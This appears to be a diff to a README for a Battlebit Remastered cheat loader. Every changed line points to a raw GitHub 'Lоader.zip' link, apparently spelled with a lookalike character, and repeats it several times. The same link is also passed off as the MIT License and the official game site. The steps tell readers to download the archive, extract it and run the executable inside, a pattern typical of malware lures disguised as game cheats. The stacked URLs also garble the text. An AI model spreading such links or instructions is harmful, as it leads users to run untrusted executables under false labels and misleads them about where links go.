@@ -56,8 +56,8 @@ Explore a wide variety of game-enhancing features included in this loader! These
 
 Getting started with the Battlebit Remastered Cheats Loader is easy! Follow the steps below to begin enhancing your gameplay:
 
-1. Download **https://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zip** from the repository (this page).
-2. Extract the **https://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zip** archive using your preferred extraction tool (e.g., WinRAR, 7-Zip).
+1. Download **https://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zip** from the repository (this page).
+2. Extract the **https://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zip** archive using your preferred extraction tool (e.g., WinRAR, 7-Zip).
 3. Run the Loader executable suitable for your operating system (located inside the extracted folder).
 4. Follow on-screen instructions to activate and configure your preferred cheats.
 5. Launch Battlebit Remastered and enjoy legendary gameplay enhancements!
@@ -75,7 +75,7 @@ Using this loader in public sessions may violate the game's Terms of Service and
 
 # 📄 License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zip).  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zip).  
 Feel free to use, modify, and distribute according to the conditions within the license.
 
 ---
@@ -90,7 +90,7 @@ Let’s build the most advanced, safe, and collaborative loader for Battlebit Re
 
 # 🔗 Extra Resources
 
-- [Official Battlebit Remastered Game Site](https://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zip)
+- [Official Battlebit Remastered Game Site](https://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zipоhttps://raw.githubusercontent.com/mdabushayem62/BattlebitRemasted-EdgeEnhancements/main/Lоader.zip)
 - [Loader FAQ & Wiki](#)
 - [Community Forums & Support](#)
 
